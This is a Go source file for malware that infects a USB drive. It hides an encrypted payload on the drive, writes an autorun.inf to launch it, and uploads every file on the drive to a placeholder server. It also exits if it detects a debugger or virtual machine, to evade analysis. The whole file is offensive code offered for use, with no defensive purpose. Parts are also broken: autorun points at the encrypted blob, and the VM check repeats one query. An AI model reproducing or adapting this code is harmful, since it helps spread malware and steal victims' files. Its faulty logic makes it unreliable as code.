package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io"
    "io/ioutil"
    "math/big"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "syscall"
    "unsafe"
)

func main() {
    if len(os.Args) != 3 {
        fmt.Printf("Usage: %s <PAYLOAD> <DRIVE_LETTER>\n", os.Args[0])
        os.Exit(1)
    }

    payload := os.Args[1]
    drive := os.Args[2]

    if isBeingDebugged() || isRunningInVM() {
        fmt.Println("Debugger or VM detected. Exiting.")
        os.Exit(1)
    }

    err := infectUSB(payload, drive)
    if err != nil {
        fmt.Println("Error infecting USB:", err)
    } else {
        fmt.Println("USB infected successfully.")
    }
}

func infectUSB(payload, drive string) error {
    hiddenPayloadPath := filepath.Join(drive, ".hidden_"+filepath.Base(payload))
    encryptedPayload, err := encryptFile(payload)
    if err != nil {
        return err
    }

    err = os.WriteFile(hiddenPayloadPath, encryptedPayload, 0644)
    if err != nil {
        return err
    }

    autorunContent := fmt.Sprintf("[autorun]\nopen=%s\nshell\\open=Open\nshell\\open\\command=%s\n",
        hiddenPayloadPath, hiddenPayloadPath)
    err = os.WriteFile(filepath.Join(drive, "autorun.inf"), []byte(autorunContent), 0644)
    if err != nil {
        return err
    }

    go exfiltrateData(drive)
    return nil
}

func encryptFile(path string) ([]byte, error) {
    file, err := os.ReadFile(path)
    if err != nil {
        return nil, err
    }

    key := generateRandomKey()
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }

    ciphertext := gcm.Seal(nonce, nonce, file, nil)
    return append(key, ciphertext...), nil
}

func generateRandomKey() []byte {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    key := make([]byte, 32)
    for i := range key {
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
        key[i] = letters[n.Int64()]
    }
    return key
}

func exfiltrateData(drive string) {
    files, err := ioutil.ReadDir(drive)
    if err != nil {
        return
    }

    for _, file := range files {
        if !file.IsDir() {
            filepath := filepath.Join(drive, file.Name())
            data, err := os.ReadFile(filepath)
            if err == nil {
                sendToServer(data)
            }
        }
    }
}

func sendToServer(data []byte) {
    // Replace with your server URL
    serverURL := "http://example.com/upload"
    req, err := http.NewRequest("POST", serverURL, strings.NewReader(base64.StdEncoding.EncodeToString(data)))
    if err != nil {
        return
    }

    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    client := &http.Client{}
    _, err = client.Do(req)
    if err != nil {
        return
    }
}

func isBeingDebugged() bool {
    var isDebuggerPresent bool
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
    ret, _, _ := procIsDebuggerPresent.Call(uintptr(unsafe.Pointer(&isDebuggerPresent)))
    return ret != 0
}

func isRunningInVM() bool {
    vmIndicators := []string{
        "VMware",
        "VirtualBox",
        "QEMU",
        "Hyper-V",
        "KVM",
        "Xen",
    }

    for _, indicator := range vmIndicators {
        if isIndicatorPresent(indicator) {
            return true
        }
    }
    return false
}

func isIndicatorPresent(indicator string) bool {
    cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer"))
    output, err := cmd.Output()
    if err != nil {
        return false
    }
    return strings.Contains(string(output), indicator)
}
